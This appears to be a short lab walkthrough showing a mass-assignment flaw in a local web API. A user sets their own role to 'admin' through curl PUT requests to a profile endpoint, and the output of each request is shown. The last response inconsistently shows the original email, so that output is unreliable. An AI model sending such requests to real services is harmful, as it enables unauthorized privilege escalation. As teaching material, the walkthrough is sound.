# Finding the Bug

## Enumerate the API

Log in and read your profile:

```bash
curl -s -c /tmp/cookies.txt -o /dev/null -w "%{http_code}" \
    -H 'Content-Type: application/json' \
    -d '{"username":"alice","password":"password123"}' \
    http://127.0.0.1:8084/login
```

```
200
```

```bash
curl -s -b /tmp/cookies.txt http://127.0.0.1:8084/api/user/profile
```

```json
{"email": "alice@corp.local", "role": "user"}
```

The response includes a `role` field. This tells you the field exists in the user model. If the PUT endpoint accepts it, you can change it.

## Test the update endpoint

Confirm the endpoint exists and accepts JSON:

```bash
curl -s -X PUT -b /tmp/cookies.txt \
    -H 'Content-Type: application/json' \
    -d '{"email": "attacker@evil.com"}' \
    http://127.0.0.1:8084/api/user/profile
```

```json
{"ok": true, "profile": {"email": "attacker@evil.com", "role": "user"}}
```

The email changed. The response includes the full updated profile, still showing `"role": "user"`.

## Check whether role is writable

Send the same PUT with `role` added:

```bash
curl -s -X PUT -b /tmp/cookies.txt \
    -H 'Content-Type: application/json' \
    -d '{"role": "admin"}' \
    http://127.0.0.1:8084/api/user/profile
```

```json
{"ok": true, "profile": {"email": "alice@corp.local", "role": "admin"}}
```

The response shows `"role": "admin"`. The server accepted the field. The vulnerability is confirmed.
